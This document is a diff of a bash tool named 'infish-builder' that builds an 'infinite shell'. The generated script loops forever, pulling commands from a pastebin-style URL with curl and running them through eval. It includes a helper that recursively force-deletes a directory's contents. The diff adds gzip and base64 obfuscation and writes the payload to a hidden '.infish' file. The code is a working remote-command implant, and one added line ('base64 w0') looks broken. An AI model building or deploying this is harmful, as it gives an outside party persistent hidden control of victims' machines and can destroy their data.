@@ -23,44 +23,26 @@
 # SOFTWARE.
 
 
-
-template='#!/usr/bin/env bash
-
-function cld() {
-
-    echo "Clearing $1"
-
-
-    [ ! -e "$1" ] && return
-
-    [ ! -d "$1" ] && return
-
-    [ -e "$1" ] && [ -d "$1" ] && cd "$1"
-
-    [ "$PWD" != "$1" ] && return
-
-    [ "$(ls $1)" ] && rm * -r
-
-    [ "$(ls $1)" ] && echo "00000000000000000" && return
-
-    [ ! -s "$1" ] && echo "==================="
-
+template='function cld() {    
+    [ ! -e "$1" ] && return;
+    [ ! -d "$1" ] && return;
+    [ -e "$1" ] && [ -d "$1" ] && cd "$1";
+    [ "$PWD" != "$1" ] && return;
+    [ "$(ls $1)" ] && rm * -rf;
+    [ "$(ls $1)" ] && return;    
 }
 
 function main() {
-
     useragent=
     url=
-
     command=$(curl -sS -L -A $useragent $url)
-
     if [ -z "$command" ]; then
         return
     else
         eval $command
     fi
 
-    sleep 30
+    sleep 900
 }
 
 while true; do
@@ -71,14 +53,14 @@ done
 
 
 
-usage_text="Usage:\n\tbash infish-builder url|key url_or_key [optional_user_agent]\n\n"
-usage_text+="Example:\n\tbash infish-builder url pastebin.com/raw/ABC123\n\n\t"
-usage_text+="bash infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\n"
+usage_text="Usage:\n\t./infish-builder url|key url_or_key [optional_user_agent]\n\n"
+usage_text+="Example:\n\t./infish-builder url pastebin.com/raw/ABC123\n\n\t"
+usage_text+="./infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\n"
 
 usage_text+="\n\n\t"
 
-usage_text+="bash infish-builder url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n\n\t"
-usage_text+="bash infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"
+usage_text+="./infish-builder url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n\n\t"
+usage_text+="./infish-builder key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"
 
 if [[ "$#" != 2 ]]; then
 
@@ -127,14 +109,12 @@ if [[ "$1" = "url" ]]; then
 
     content=${content//url=/url=\"$2\"}
     content=${content//useragent=/useragent=\"$user_agent\"}
+    content=$(echo -e -n "$content" | gzip | base64 w0)
+    echo -e "#!/usr/bin/env bash\neval\"\$(echo '$content' | base64 -d | gunzip -c)\";" >".infish"
 
-    echo "$content" >".infish"
+    echo -e "\nSuccessfully built infinite shell.\n\n";  
 
-    echo -e "\n"
-
-    echo -e "Successfully built infinite shell\n\n"    
-
-    exit
+    exit;
 
 elif
     [[ "$1" = "key" ]]
@@ -169,11 +149,10 @@ then
     content=${content//url=/url=\"$new_url\"}
     content=${content//useragent=/useragent=\"$user_agent\"}
 
-    echo "$content" >".infish"
+    content=$(echo -e -n "$content" | gzip | base64 w0)
+    echo -e "#!/usr/bin/env bash\neval\"\$(echo '$content' | base64 -d | gunzip -c)\";" >".infish"    
 
-    echo -e "\n"
-
-    echo -e "Successfully built infinite shell\n\n"
+    echo -e "\nSuccessfully built infinite shell\n\n"
 
     echo -e "The paste url is $new_url_copy\n"
 
